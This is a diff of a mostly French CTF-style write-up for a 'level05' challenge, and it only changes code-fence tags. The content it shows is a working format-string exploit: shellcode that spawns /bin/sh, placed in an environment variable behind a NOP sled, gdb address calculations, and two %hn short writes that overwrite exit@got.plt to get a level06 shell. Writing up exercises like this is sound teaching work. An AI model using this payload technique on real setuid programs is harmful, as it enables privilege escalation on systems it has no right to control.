@@ -33,7 +33,8 @@ Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter nu
   
 ```bash
 export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")  
-
+```
+```gdb
 (gdb) x/s *((char **)environ+0)  
 0xffffd74a:      "EXPLOIT=<...>"  
   
@@ -44,6 +45,7 @@ $1 = 4294957074
 (gdb) p/x 0xffffd74a+200  
 $2 = 0xffffd812  
 (gdb) x/s 0xffffd812  
+```
   
 We get exit function address:
 
@@ -81,7 +83,7 @@ https://cs155.stanford.edu/papers/formatstring-1.2.pdf
   
 Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite. 
   
-```bash
+```gdb
 (gdb) p/d 0xd812  
 $4 = 55314  
 (gdb) p/d 0xd812-8  
@@ -90,10 +92,9 @@ $5 = 55306
 gdb-peda$ p/d 0xffff  
 $5 = 65535  
 (gdb) p/d 0xffff-55314  
-$6 = 10221  
-  
+$6 = 10221
 ```
-
+```gdb
 => 0x08048475 <+49>:    call   0x8048350 <fgets@plt> ; Size == 100  
 (gdb) x/wx $esp  
 0xffffd470:     0xffffd498  
@@ -127,8 +128,10 @@ Dump of assembler code for function exit@got.plt:
    0x080497e2 <+2>:     (bad)  
    0x080497e3 <+3>:     jmp    DWORD PTR [eax]
 End of assembler dump.
-  
+```
+```bash
 (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn")'; cat) | ./level05  
 <...>  
 whoami  
 level06  
+```
